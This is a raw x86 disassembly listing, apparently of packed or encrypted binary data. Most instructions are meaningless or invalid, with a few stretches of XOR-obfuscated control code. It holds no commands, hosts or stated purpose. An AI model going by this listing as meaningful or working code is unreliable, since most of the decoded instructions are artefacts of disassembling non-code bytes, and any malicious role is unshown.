  4020b9:	mov    esi,edi
  4020bb:	lock xor eax,0x4782e981
  4020c1:	outs   dx,DWORD PTR ds:[esi]
  4020c2:	stos   BYTE PTR es:[edi],al
  4020c3:	sub    ah,dh
  4020c5:	lods   al,BYTE PTR ds:[esi]
  4020c6:	in     eax,dx
  4020c7:	cmp    BYTE PTR [edx],ah
  4020c9:	push   ecx
  4020ca:	call   0x672b:0x42f7433b
  4020d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4020d2:	test   al,0xef
  4020d4:	call   FWORD PTR [edi]
  4020d6:	mov    ecx,0xcdb8f461
  4020db:	inc    ebp
  4020dc:	(bad)  
  4020dd:	fld    TBYTE PTR [edx-0x72]
  4020e0:	push   ss
  4020e1:	aam    0x8f
  4020e3:	xor    bl,BYTE PTR [eax-0x6f]
  4020e6:	scas   al,BYTE PTR es:[edi]
  4020e7:	hlt    
  4020e8:	dec    ebp
  4020e9:	out    dx,al
  4020ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4020eb:	call   0xe774:0xa41fe5b2
  4020f2:	cli    
  4020f3:	adc    BYTE PTR [esi+edi*8+0x3b],ah
  4020f7:	mov    dl,0x4f
  4020f9:	dec    ebp
  4020fa:	dec    esi
  4020fb:	sub    BYTE PTR [eax+edi*1+0x680b12df],dh
  402102:	ficom  WORD PTR [ecx-0x59]
  402105:	(bad)  
  402106:	mov    ecx,0xeb0708a
  40210b:	outs   dx,DWORD PTR ds:[esi]
  40210c:	std    
  40210d:	int3   
  40210e:	jae    0x4020e8
  402110:	imul   esi,DWORD PTR [ebx],0xacbe92a2
  402116:	in     eax,0x80
  402118:	gs xchg esp,edi
  40211b:	pop    ss
  40211c:	adc    edi,DWORD PTR [ebp-0x4d0feccc]
  402122:	loop   0x40211b
  402124:	or     al,0xb3
  402126:	mov    esp,0x4c5609d2
  40212b:	lods   eax,DWORD PTR ds:[esi]
  40212c:	pop    ss
  40212d:	inc    edx
  40212e:	mov    bh,0x66
  402130:	mov    BYTE PTR [ecx+0x33],cl
  402133:	sbb    cl,BYTE PTR [eax+eiz*8+0x5be0c6fd]
  40213a:	ins    DWORD PTR es:[edi],dx
  40213b:	mov    dl,0x47
  40213d:	adc    edx,DWORD PTR [ebx-0x1e]
  402140:	inc    eax
  402141:	loopne 0x4020ec
  402143:	sub    al,0xa8
  402145:	mov    WORD PTR [ecx+edx*4],?
  402148:	sub    bh,bh
  40214a:	clc    
  40214b:	je     0x402122
  40214d:	aaa    
  40214e:	ins    DWORD PTR es:[edi],dx
  40214f:	inc    ebp
  402150:	or     edx,DWORD PTR [eax+0x49589602]
  402156:	and    DWORD PTR [esi],edi
  402158:	mov    al,ds:0x2c92fb9b
  40215d:	sbb    al,0xf9
  40215f:	mov    ebp,0x28cbe732
  402164:	cwde   
  402165:	mov    DWORD PTR [ebx-0x23f8c899],ecx
  40216b:	jge    0x4021d8
  40216d:	sbb    eax,0x4fcaeeb3
  402172:	pusha  
  402173:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402174:	push   ecx
  402175:	call   DWORD PTR [eax-0x5e]
  402178:	inc    ebx
  402179:	dec    edx
  40217a:	push   esp
  40217b:	js     0x402104
  40217d:	sbb    dh,BYTE PTR [esi]
  40217f:	pop    ecx
  402180:	jecxz  0x402194
  402182:	je     0x402181
  402184:	fucomi st,st(6)
  402186:	bnd jle 0x40218c
  402189:	icebp  
  40218a:	in     al,0xe7
  40218c:	add    BYTE PTR [ebx+0x4],cl
  40218f:	xor    al,dl
  402191:	in     al,dx
  402192:	pop    ecx
  402193:	xchg   edx,eax
  402194:	sbb    eax,0x62711a0f
  402199:	fiadd  DWORD PTR [ebx+0x61]
  40219c:	(bad)  
  40219d:	out    0xbb,al
  40219f:	outs   dx,DWORD PTR ds:[esi]
  4021a0:	xlat   BYTE PTR ds:[ebx]
  4021a1:	mov    esi,0x66b7f01b
  4021a6:	ss in  eax,dx
  4021a8:	xchg   cl,ah
  4021aa:	sbb    al,bl
  4021ac:	iret   
  4021ad:	arpl   WORD PTR [edi],dx
  4021af:	jb     0x4021b9
  4021b1:	mov    bl,bl
  4021b3:	sbb    al,0xa5
  4021b5:	adc    esp,DWORD PTR [eax+0x16]
  4021b8:	test   DWORD PTR [edi],edi
  4021ba:	add    edx,DWORD PTR [ecx+edx*8+0x76]
  4021be:	adc    DWORD PTR [ebp+0x71],ecx
  4021c1:	test   DWORD PTR [ebx+edi*1],ebx
  4021c4:	xor    dl,bl
  4021c6:	jbe    0x4021b3
  4021c8:	lea    edi,[ecx+0xe9e48e1]
  4021ce:	xchg   BYTE PTR [eax+0x6dc6473e],al
  4021d4:	and    BYTE PTR [edi-0x7ea0384c],al
  4021da:	es jle 0x40217e
  4021dd:	es push ss
  4021df:	jne    0x4021b7
  4021e1:	jmp    0x5baf:0xfa877a58
  4021e8:	aam    0xdf
  4021ea:	dec    ecx
  4021eb:	test   BYTE PTR [ecx-0x62],bh
  4021ee:	mov    ds:0x951f5524,eax
  4021f3:	lds    esp,FWORD PTR [eax]
  4021f5:	cmp    DWORD PTR [eax+0x5c0dac9e],edi
  4021fb:	in     al,0x88
  4021fd:	cmp    eax,DWORD PTR [edx-0x5]
  402200:	mov    esp,esp
  402202:	mov    dl,0x12
  402204:	cmp    eax,0xfb672b05
  402209:	popf   
  40220a:	adc    eax,0x97835ff7
  40220f:	or     BYTE PTR [ecx+eax*4-0x687b33e7],0x23
  402217:	adc    eax,0x5efbe625
  40221c:	dec    esp
  40221d:	cmp    BYTE PTR [edx+0x40db16f6],dl
  402223:	popf   
  402224:	push   edi
  402225:	test   eax,0x9a6e429b
  40222a:	in     al,dx
  40222b:	mov    ecx,gs
  40222d:	jl     0x4021af
  40222f:	fcmovnbe st,st(0)
  402231:	xchg   edx,eax
  402232:	aaa    
  402233:	sbb    eax,0x6fb4ddf1
  402238:	cmp    BYTE PTR ds:0x7ce5d70e,ah
  40223e:	ds call 0x6bc4138b
  402244:	scas   al,BYTE PTR es:[edi]
  402245:	retf   0x1ef9
  402248:	ds out 0x94,al
  40224b:	mov    eax,0x7cdd9d9e
  402250:	mov    ebx,0x9c1fda09
  402255:	in     eax,dx
  402256:	sub    DWORD PTR [eax-0x2f2f5447],esi
  40225c:	lods   eax,DWORD PTR ds:[esi]
  40225d:	adc    ah,ch
  40225f:	jb     0x402225
  402261:	cmp    ch,BYTE PTR [ecx+eax*2]
  402264:	jo     0x40227a
  402266:	sub    al,0x62
  402268:	sub    BYTE PTR es:[edi],cl
  40226b:	fsub   st(2),st
  40226d:	imul   esi,DWORD PTR [eax],0x82accce9
  402273:	jp     0x402241
  402275:	test   ebx,0x99180b16
  40227b:	addr16 (bad) 
  40227d:	add    cl,al
  40227f:	mov    esp,0x289c1767
  402284:	jbe    0x402272
  402286:	arpl   WORD PTR [eax+0x5d],bp
  402289:	sbb    al,0x77
  40228b:	or     dl,bl
  40228d:	sbb    ebp,DWORD PTR [esi+eax*1-0x35534b4b]
  402294:	add    DWORD PTR [ecx],esi
  402296:	jo     0x40224f
  402298:	dec    edi
  402299:	inc    esi
  40229a:	fld    TBYTE PTR [esi+0x7ff5c4d1]
  4022a0:	pushf  
  4022a1:	xchg   esp,eax
  4022a2:	stc    
  4022a3:	out    0xbc,al
  4022a5:	xor    eax,esi
  4022a7:	and    DWORD PTR ds:0x42a771,0x42a7b5
  4022b1:	add    eax,edi
  4022b3:	cmp    DWORD PTR [ecx],eax
  4022b5:	jne    0x402dc8
  4022bb:	mov    eax,DWORD PTR [ebp+0x8]
  4022be:	mov    ecx,DWORD PTR [ebp-0x18]
  4022c1:	sbb    DWORD PTR ds:0x42a835,0x2700
  4022cb:	xor    eax,esi
  4022cd:	add    eax,edi
  4022cf:	jmp    0x40256e
  4022d4:	xlat   BYTE PTR ds:[ebx]
  4022d5:	cmp    eax,0xd9d5d1c7
  4022da:	fxch   st(1)
  4022dc:	mov    edi,0xfb682c5b
  4022e1:	lods   eax,DWORD PTR ds:[esi]
  4022e2:	push   DWORD PTR [ebp+0x4]
  4022e5:	or     DWORD PTR [eax+0x78],edi
  4022e8:	(bad)  
  4022e9:	jle    0x402363
  4022eb:	js     0x402283
  4022ed:	out    0xea,eax
  4022ef:	cs icebp 
  4022f1:	out    dx,eax
  4022f2:	stos   DWORD PTR es:[edi],eax
  4022f3:	aaa    
  4022f4:	dec    esp
  4022f5:	sbb    al,0xd4
  4022f7:	and    dl,BYTE PTR [ebx+0x6bc36521]
  4022fd:	es dec ebp
  4022ff:	jge    0x4022cf
  402301:	and    edi,eax
  402303:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402304:	js     0x4022f7
  402306:	push   ebp
  402307:	dec    eax
  402308:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402309:	fsub   DWORD PTR [edx+ecx*8+0x1f]
  40230d:	(bad)  
  40230e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40230f:	nop
  402310:	arpl   WORD PTR [edx],cx
  402312:	add    BYTE PTR [ebp+0x306f0391],ch
  402318:	daa    
  402319:	cmp    BYTE PTR [ebp+0x19cf31cf],al
  40231f:	jmp    0x5759:0x510d4fac
  402326:	bound  ebp,QWORD PTR [ebp-0x44]
  402329:	std    
  40232a:	and    DWORD PTR [esi+0x442d7ff5],edx
  402330:	mov    al,0x96
  402332:	imul   edx,edx,0x46fd7f40
  402338:	adc    edx,DWORD PTR [ebx]
  40233a:	(bad)  
  40233b:	ss push es
  40233d:	ins    DWORD PTR es:[edi],dx
  40233e:	(bad)  
  40233f:	jo     0x40236b
  402341:	pop    ss
  402342:	neg    DWORD PTR [eax]
  402344:	outs   dx,DWORD PTR ds:[esi]
  402345:	(bad)  ds:0x36ce8245
  40234b:	push   0xeb2bf3ad
  402350:	std    
  402351:	cmp    al,0x46
  402353:	fsub   QWORD PTR [ebx+0x5d]
  402356:	jo     0x4023b7
  402358:	mov    dh,0x99
  40235a:	dec    ebp
  40235b:	mov    eax,ds:0xd0383b9f
  402360:	jge    0x4022e2
  402362:	or     esp,esp
  402364:	sbb    BYTE PTR ds:0xd76460cb,0xd5
  40236b:	pop    es
  40236c:	jmp    0x96be:0xc68047b1
  402373:	xchg   esp,eax
  402374:	test   DWORD PTR [ebx],eax
  402376:	or     BYTE PTR [ebx+0x389990cc],bl
  40237c:	repnz ins DWORD PTR es:[edi],dx
  40237e:	test   BYTE PTR [edx+edi*2-0x44726ba0],ah
  402385:	dec    ebp
  402386:	and    eax,0xbf357fb1
  40238b:	rcl    DWORD PTR [ecx+0x79],cl
  40238e:	je     0x40239a
  402390:	sahf   
  402391:	sub    ebp,DWORD PTR cs:[edi+0x3a693691]
  402398:	int    0x6
  40239a:	ins    BYTE PTR es:[edi],dx
  40239b:	push   ecx
  40239c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40239d:	mov    dh,0x34
  40239f:	pop    ecx
  4023a0:	rcl    DWORD PTR [ebx+0x72327a31],cl
  4023a6:	mov    eax,0xe65468b2
  4023ab:	or     eax,0xad5d158d
  4023b0:	dec    edx
  4023b1:	call   0xd1f7:0x91936f31
  4023b8:	pop    esi
  4023b9:	jno    0x4023c4
  4023bb:	in     al,dx
  4023bc:	add    ch,cl
  4023be:	mov    al,ds:0x367998c
  4023c3:	sbb    al,0x45
  4023c5:	dec    esi
  4023c6:	je     0x4023f0
  4023c8:	sub    ch,BYTE PTR [esi+0x4576f96c]
  4023ce:	cs sub al,0xfe
  4023d1:	pop    ebp
  4023d2:	xchg   ebx,eax
  4023d3:	sub    bl,0x21
  4023d6:	cmp    eax,0xcbc02204
  4023db:	mov    edx,0xca581499
  4023e0:	imul   edx,DWORD PTR ds:0x306e556c,0xce1fc2a3
  4023ea:	js     0x402408
  4023ec:	pop    ebp
  4023ed:	mov    ecx,0xb788e36b
  4023f2:	mov    cl,0xf4
  4023f4:	lahf   
  4023f5:	aas    
  4023f6:	jle    0x402396
  4023f8:	jnp    0x402470
  4023fa:	mov    edx,0xc852dbe4
  4023ff:	push   ds
  402400:	push   esi
  402401:	icebp  
  402402:	rcr    esi,cl
  402404:	add    BYTE PTR [ecx-0x6316ebaa],dh
  40240a:	mov    ah,BYTE PTR [esi+0x38139d2c]
  402410:	in     al,0xcc
  402412:	pusha  
  402413:	rol    BYTE PTR [esi-0x5e18676f],cl
  402419:	sub    esi,DWORD PTR [esi]
  40241b:	inc    ecx
  40241c:	and    edi,DWORD PTR [ecx-0x77066c3a]
  402422:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402423:	mov    esi,0x18aff4a0
  402428:	dec    ebp
  402429:	dec    ebp
  40242a:	mov    eax,0x6683982b
  40242f:	leave  
  402430:	iret   
  402431:	xor    al,BYTE PTR [ecx+0x5027be6b]
  402437:	pop    ecx
  402438:	shl    ebp,0xe
  40243b:	aas    
  40243c:	mov    al,0x1b
  40243e:	push   esp
  40243f:	mov    edi,0x70f2d490
  402444:	test   al,al
  402446:	iret   
  402447:	adc    al,0xa1
  402449:	sbb    DWORD PTR [ecx],eax
  40244b:	or     ebx,DWORD PTR [ecx]
  40244d:	pop    esi
  40244e:	ret    
  40244f:	add    al,0xa5
  402451:	ins    BYTE PTR es:[edi],dx
  402452:	nop
  402453:	jmp    0x4023fb
  402455:	cld    
  402456:	mov    ecx,cs
  402458:	mov    ch,0xa2
  40245a:	mov    ds:0x223e02f,al
  40245f:	xor    al,0xec
  402461:	mov    edi,0x5f073691
  402466:	pop    edx
  402467:	xchg   ecx,eax
  402468:	or     al,0xe6
  40246a:	xor    edi,edx
  40246c:	cmc    
  40246d:	les    esp,FWORD PTR [esi+ebx*1]
  402470:	cmp    cl,bh
  402472:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402473:	jbe    0x402440
  402475:	(bad)  
  402476:	lea    ebp,[ecx-0x58]
  402479:	xor    eax,0xe55dc9a9
  40247e:	arpl   WORD PTR [edx+0xb],ax
  402481:	mov    ch,0x5d
  402483:	cdq    
  402484:	adc    DWORD PTR [edi-0x26],eax
  402487:	pop    ecx
  402488:	inc    esi
  402489:	enterw 0x8486,0xe1
  40248e:	shr    BYTE PTR [edx-0x338496a3],cl
  402494:	loopne 0x40248e
  402496:	ror    DWORD PTR [ebp-0x6],1
  402499:	imul   eax,DWORD PTR [edx-0x50],0xf1ca45d6
  4024a0:	outs   dx,BYTE PTR ds:[esi]
  4024a1:	cmp    ecx,DWORD PTR [edi]
  4024a3:	addr16 and esi,ebp
  4024a6:	or     eax,0x1d8f944b
  4024ab:	jns    0x40247e
  4024ad:	push   eax
  4024ae:	rcr    BYTE PTR ds:0x2f28902b,0x3a
  4024b5:	mov    DWORD PTR [ebp-0x7f],ebp
  4024b8:	sub    al,0x6a
  4024ba:	hlt    
  4024bb:	inc    edi
  4024bc:	adc    al,0x84
  4024be:	enter  0x769d,0x8a
  4024c2:	daa    
  4024c3:	mov    al,ds:0xf81f6b77
  4024c8:	out    dx,al
  4024c9:	xchg   edx,eax
  4024ca:	clc    
  4024cb:	mov    ebp,0xa383de76
  4024d0:	lahf   
  4024d1:	mov    dl,0x37
  4024d3:	hlt    
  4024d4:	bound  esp,QWORD PTR [eax+eiz*8]
  4024d7:	dec    eax
  4024d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4024d9:	mov    edx,0xd26eec1f
  4024de:	loop   0x40252c
  4024e0:	push   es
  4024e1:	sti    
  4024e2:	fimul  WORD PTR [eax-0x3b]
  4024e5:	adc    DWORD PTR ds:0x81ef7030,ebp
  4024eb:	je     0x4024d9
  4024ed:	pop    es
  4024ee:	add    edi,ebx
  4024f0:	xchg   ebp,eax
  4024f1:	dec    ebx
  4024f2:	mov    dl,0xad
  4024f4:	fs std 
  4024f6:	aam    0x92
  4024f8:	ud2    
  4024fa:	or     bh,ah
  4024fc:	sub    cl,BYTE PTR [ecx-0x620e56d2]
  402502:	adc    eax,0xfa490737
  402507:	or     BYTE PTR [esp],dl
  40250a:	push   esp
  40250b:	popa   
  40250c:	mov    ebx,0x188dcc7a
  402511:	ficomp WORD PTR [ebx]
  402513:	adc    DWORD PTR [edi+0x3396f07f],ecx
  402519:	pop    edi
  40251a:	sbb    eax,0x40737278
  40251f:	sub    eax,0x539a2d44
  402524:	fwait
  402525:	imul   esi
  402527:	mov    cl,BYTE PTR ds:0x262c7f35
  40252d:	xchg   esi,eax
  40252e:	sar    cl,1
  402530:	hlt    
  402531:	mov    edx,cs
  402533:	hlt    
  402534:	push   0x2b
  402536:	(bad)  
  402537:	mov    cl,0x6
  402539:	fsubr  QWORD PTR [ecx]
  40253b:	aad    0xe0
  40253d:	idiv   DWORD PTR [esi+0x5c]
  402540:	(bad)  
  402541:	loope  0x402521
  402543:	jns    0x4025ab
  402545:	add    DWORD PTR [ecx],edi
  402547:	pop    ecx
  402548:	jle    0x40254e
  40254a:	outs   dx,DWORD PTR ds:[esi]
  40254b:	lods   eax,DWORD PTR ds:[esi]
  40254c:	jmp    0x40259b
  40254e:	out    dx,eax
  40254f:	inc    edi
  402550:	push   ds
  402551:	xchg   esp,eax
  402552:	mov    ds:0x9a2139f8,al
  402557:	push   edi
  402558:	and    eax,0x33ac3195
  40255d:	mov    eax,ds:0x5e911ae6
  402562:	pop    eax
  402563:	cmp    al,0x46
  402565:	lahf   
  402566:	mov    edi,0xdce49540
  40256b:	cmc    
  40256c:	mov    eax,0xf013919
  402571:	test   DWORD PTR [edx+eax*1+0x458b0000],edi
  402578:	or     BYTE PTR [ebx-0x39cc0fb3],cl
  40257e:	add    eax,edi
  402580:	mov    DWORD PTR [ecx],eax
  402582:	jmp    0x402821
  402587:	aas    
  402588:	retf   
  402589:	ret    0xcace
  40258c:	aad    0xd3
  40258e:	fld    DWORD PTR [ecx+eiz*1+0x26]
  402592:	inc    edx
  402593:	fs push ecx
  402595:	jne    0x40258c
  402597:	mov    cl,BYTE PTR [edi]
  402599:	js     0x402613
  40259b:	(bad)  
  40259c:	jle    0x402616
  40259e:	js     0x40257c
  4025a0:	dec    ecx
  4025a1:	push   eax
  4025a2:	dec    edi
  4025a3:	xchg   DWORD PTR [edx+0x37],esi
  4025a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4025a7:	sar    BYTE PTR [edi],cl
  4025a9:	jmp    0x87846574
  4025ae:	mov    dh,0xb2
  4025b0:	pop    edx
  4025b1:	mov    cl,0xf2
  4025b3:	inc    edi
  4025b4:	cmp    al,BYTE PTR ds:0x4e557ace
  4025ba:	and    bh,BYTE PTR [eax]
  4025bc:	sub    DWORD PTR [ebp-0x59a53e28],edx
  4025c2:	fidivr WORD PTR [ecx-0x20]
  4025c5:	inc    esi
  4025c6:	jno    0x40263c
  4025c8:	stos   DWORD PTR es:[edi],eax
  4025c9:	adc    DWORD PTR [edi+0x1f],ebx
  4025cc:	mov    al,ds:0x2549fe73
  4025d1:	mov    dl,0xc1
  4025d3:	push   ds
  4025d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4025d5:	fs daa 
  4025d7:	xchg   ebp,eax
  4025d8:	push   eax
  4025d9:	icebp  
  4025da:	addr16 ret 
  4025dc:	das    
  4025dd:	adc    ebp,DWORD PTR [esi+ebp*2-0x6a]
  4025e1:	loop   0x40258b
  4025e3:	jne    0x4025ba
  4025e5:	nop
  4025e6:	and    esi,DWORD PTR [edi-0x3c]
  4025e9:	sbb    BYTE PTR [eax-0x718cb5be],dl
  4025ef:	jmp    0x402629
  4025f1:	out    dx,al
  4025f2:	pusha  
  4025f3:	add    ch,BYTE PTR [ecx+0x3d0b56cf]
  4025f9:	(bad)  
  4025fb:	mov    fs,WORD PTR [ecx+0x45]
  4025fe:	repnz and bh,BYTE PTR [esi]
  402601:	jle    0x40264d
  402603:	inc    esp
  402604:	cmp    DWORD PTR [ecx],edx
  402606:	popa   
  402607:	ins    DWORD PTR es:[edi],dx
  402608:	jbe    0x402689
  40260a:	scas   eax,DWORD PTR es:[edi]
  40260b:	daa    
  40260c:	sbb    ebp,eax
  40260e:	add    ch,BYTE PTR [eax-0x7812044]
  402614:	sbb    BYTE PTR [ebp+0x39],dl
  402617:	pop    ecx
  402618:	jmp    0x40263b
  40261a:	cmp    BYTE PTR [ecx-0x43d2be78],bh
  402620:	add    eax,0x91a0c1f7
  402625:	inc    ebp
  402626:	(bad)  
  402627:	jnp    0x402653
  402629:	xor    esp,DWORD PTR [edx-0x3dc181f]
  40262f:	stos   DWORD PTR es:[di],eax
  402631:	sub    eax,0x8325d108
  402636:	push   ds
  402637:	sbb    bl,BYTE PTR [esi+esi*8-0xa]
  40263b:	mov    WORD PTR [edi+0x2a],ds
  40263e:	xor    edi,DWORD PTR [edx]
  402640:	mov    ecx,0x36c37579
  402645:	bnd jnp 0x402639
  402648:	cmp    al,0x8d
  40264a:	add    al,0xd4
  40264c:	sub    bl,BYTE PTR [ebx]
  40264e:	cld    
  40264f:	maxps  xmm6,XMMWORD PTR [edx]
  402652:	(bad)  
  402653:	scas   al,BYTE PTR es:[edi]
  402654:	sti    
  402655:	(bad)  
  402656:	fsub   QWORD PTR [ecx-0x722a9701]
  40265c:	xchg   DWORD PTR [edi],esi
  40265e:	out    dx,al
  40265f:	mov    ?,WORD PTR [ebp+esi*2-0x7154aa10]
  402666:	outs   dx,DWORD PTR ds:[esi]
  402667:	dec    edi
  402668:	xlat   BYTE PTR ds:[ebx]
  402669:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40266a:	jo     0x402631
  40266c:	dec    esp
  40266d:	jne    0x40268e
  40266f:	sbb    eax,0xb1fb08c8
  402674:	xchg   edx,eax
  402675:	sbb    BYTE PTR [esi+eax*1],al
  402678:	xor    esp,DWORD PTR [ebx+ebx*4+0x3e]
  40267c:	and    BYTE PTR ss:[edx],ah
  40267f:	mov    ds:0x39dc4f5c,al
  402684:	pop    esp
  402685:	pop    ds
  402686:	or     DWORD PTR [esi],edx
  402688:	jp     0x4026b8
  40268a:	adc    DWORD PTR [edx-0x4e],ebx
  40268d:	ja     0x4026d6
  40268f:	in     eax,0x1c
  402691:	addr16 jmp 0xe051:0x309604
  402699:	jp     0x402675
  40269b:	add    DWORD PTR [edx],ebx
  40269d:	or     DWORD PTR [esi],esi
  40269f:	in     eax,dx
  4026a0:	mov    esp,0xedfb78d0
  4026a5:	(bad)  
  4026a6:	sub    edi,DWORD PTR [eax]
  4026a8:	mov    BYTE PTR [ebx+ebx*8],bl
  4026ab:	es or  eax,ebx
  4026ae:	adc    cl,BYTE PTR [esi+0x2d05a688]
  4026b4:	push   0xffffffed
  4026b6:	icebp  
  4026b7:	push   0x55
  4026b9:	pop    edi
  4026ba:	imul   ecx,DWORD PTR [ecx-0x18036e2a],0x9855016f
  4026c4:	pop    eax
  4026c5:	nop
  4026c6:	dec    esp
  4026c7:	jl     0x4026c3
  4026c9:	int3   
  4026ca:	idiv   esp
  4026cc:	mov    esp,0x2a6dd56
  4026d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4026d2:	call   0xb69f:0xb13b03fc
  4026d9:	loopne 0x4026b3
  4026db:	test   BYTE PTR [eax+ebp*2],0x57
  4026df:	jmp    0x4bdc:0x89660e46
  4026e6:	addr16 out dx,eax
  4026e8:	adc    DWORD PTR [esi],edx
  4026ea:	je     0x40275d
  4026ec:	sub    dh,BYTE PTR [ebx]
  4026ee:	inc    ecx
  4026ef:	or     edx,DWORD PTR [ecx-0x72]
  4026f2:	das    
  4026f3:	pop    eax
  4026f4:	loop   0x4026a4
  4026f6:	mov    esp,0xb848d2fb
  4026fb:	mov    ebp,0xf2f830ea
  402700:	jp     0x402686
  402702:	ret    
  402703:	or     edi,DWORD PTR [esi+0x66]
  402706:	in     eax,0xa7
  402708:	mov    al,0xc2
  40270a:	idiv   BYTE PTR [edx]
  40270c:	leave  
  40270d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40270e:	sub    edx,DWORD PTR [esi-0x77]
  402711:	nop
  402712:	cmp    edi,DWORD PTR [edx+esi*2]
  402715:	stos   DWORD PTR es:[edi],eax
  402716:	xchg   edx,eax
  402717:	xor    DWORD PTR [ecx+0x34a73bce],edx
  40271d:	(bad)  
  40271e:	shl    BYTE PTR [ebp-0x75],cl
  402721:	(bad)  
  402722:	out    0x47,eax
  402724:	dec    esi
  402725:	push   eax
  402726:	adc    eax,0x52a20292
  40272b:	sbb    DWORD PTR [eax+0x5e],0x36
  40272f:	stos   DWORD PTR es:[edi],eax
  402730:	cmp    al,0x85
  402732:	ret    
  402733:	and    eax,0x6861cedf
  402738:	int3   
  402739:	pop    ebp
  40273a:	mov    al,ds:0xcc987454
  40273f:	push   es
  402740:	idiv   BYTE PTR [ebx]
  402742:	adc    BYTE PTR [ebx+0xe],ah
  402745:	jbe    0x40271c
  402747:	pop    ss
  402748:	cmp    eax,0x58d9312f
  40274d:	repz mov ecx,ebx
  402750:	mov    ds:0xa2e59fe0,eax
  402755:	mov    ax,0xea15
  402759:	pop    ss
  40275a:	clc    
  40275b:	sub    eax,0x6b296baa
  402760:	or     esp,DWORD PTR [edi]
  402762:	test   al,0x5a
  402764:	lds    edx,FWORD PTR [eax-0x45]
  402767:	lods   al,BYTE PTR ds:[esi]
  402768:	sub    edi,DWORD PTR [edi+0x5261b447]
  40276e:	inc    ecx
  40276f:	in     al,dx
  402770:	adc    DWORD PTR [ecx],ebx
  402772:	adc    BYTE PTR ds:0x7ad76994,dh
  402778:	rol    al,1
  40277a:	popf   
  40277b:	stc    
  40277c:	lock out 0xe3,eax
  40277f:	call   eax
  402781:	mov    ds,WORD PTR ds:0x90d9782f
  402787:	jmp    0x4670747a
  40278c:	jp     0x402750
  40278e:	mov    DWORD PTR [edi+0x32],ecx
  402791:	sar    DWORD PTR [eax-0x2e719e5f],cl
  402797:	sub    BYTE PTR [edx],al
  402799:	mov    eax,0xb0c32a06
  40279e:	je     0x4027be
  4027a0:	push   0xda123a35
  4027a5:	xor    ebx,DWORD PTR [eax-0x7c150ae1]
  4027ab:	cld    
  4027ac:	inc    ecx
  4027ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4027ae:	or     ecx,DWORD PTR [edi+0x339d4085]
  4027b4:	ret    
  4027b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4027b6:	add    BYTE PTR [esi-0xdfbdc07],0xcb
  4027bd:	cld    
  4027be:	cwde   
  4027bf:	lock mov cl,ch
  4027c2:	and    dh,ah
  4027c4:	and    al,0x60
  4027c6:	pop    edi
  4027c7:	adc    BYTE PTR [eax],0xeb
  4027ca:	xchg   DWORD PTR [ebx],esp
  4027cc:	push   ds
  4027cd:	mov    bh,0xe9
  4027cf:	push   es
  4027d0:	or     eax,0x6112bdf7
  4027d5:	inc    ebx
  4027d6:	dec    esi
  4027d7:	pop    ebx
  4027d8:	push   ebp
  4027d9:	dec    edi
  4027da:	jb     0x4027a4
  4027dc:	sti    
  4027dd:	push   esp
  4027de:	dec    ebx
  4027df:	dec    eax
  4027e0:	pop    ebx
  4027e1:	rcr    BYTE PTR [edi-0x31],0xe
  4027e5:	(bad)
  4027e8:	sub    dl,BYTE PTR [eax+0xa6c5eab]
  4027ee:	lds    ecx,FWORD PTR [edx]
  4027f0:	pop    ebp
  4027f1:	sub    esi,DWORD PTR [edi]
  4027f3:	cmp    al,0xff
  4027f5:	sar    dl,cl
  4027f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4027f8:	clc    
  4027f9:	mul    DWORD PTR [esi-0x62]
  4027fc:	xlat   BYTE PTR ds:[ebx]
  4027fd:	jp     0x40278d
  4027ff:	call   0x8c5c:0xfb25
  402805:	xor    ecx,DWORD PTR [ebx+0x781feb8c]
  40280b:	stc    
  40280c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40280d:	(bad)  
  40280e:	ja     0x4027a5
  402810:	loop   0x4027c2
  402812:	jmp    0x4027b4
  402814:	nop
  402815:	pusha  
  402816:	call   DWORD PTR [ebp-0x74]
  402819:	inc    eax
  40281a:	mov    esp,0x97a978e8
  40281f:	int3   
  402820:	xor    BYTE PTR [ebx+0x4d8bf045],cl
  402826:	adc    BYTE PTR [ebx],dh
  402828:	into   
  402829:	mov    edx,0xffcd8d68
  40282e:	sub    edx,ecx
  402830:	add    DWORD PTR [eax],edx
  402832:	mov    eax,ds:0x41ebba
  402837:	mov    eax,DWORD PTR [eax]
  402839:	mov    cx,WORD PTR [ebp-0x4]
  40283d:	movzx  ecx,cx
  402840:	add    ecx,DWORD PTR [eax]
  402842:	mov    DWORD PTR [ebp-0x18],ecx
  402845:	mov    eax,DWORD PTR [ebp+0xc]
  402848:	mov    ecx,DWORD PTR [ebp+0xc]
  40284b:	xor    eax,esi
  40284d:	lea    eax,[eax+eax*1+0x327298]
  402854:	xor    ecx,esi
  402856:	sub    ecx,eax
  402858:	mov    ax,WORD PTR [ebp-0x4]
  40285c:	movzx  eax,ax
  40285f:	cmp    eax,ecx
  402861:	mov    eax,DWORD PTR [ebp+0x10]
  402864:	movzx  ecx,WORD PTR [ebp-0x4]
  402868:	jg     0x402dbb
  40286e:	xor    eax,esi
  402870:	jmp    0x402b0f
  402875:	ret    
  402876:	ror    ecx,cl
  402878:	into   
  402879:	(bad)  
  40287b:	fcmovnbe st,st(1)
  40287d:	out    0x1c,eax
  40287f:	dec    esp
  402880:	stos   BYTE PTR es:[edi],al
  402881:	sub    cl,BYTE PTR ds:0xc0880f3
  402887:	js     0x402901
  402889:	(bad)  
  40288a:	jle    0x402904
  40288c:	js     0x402858
  40288e:	pop    ebx
  40288f:	loop   0x4028c1
  402891:	push   ds
  402892:	jnp    0x4028fb
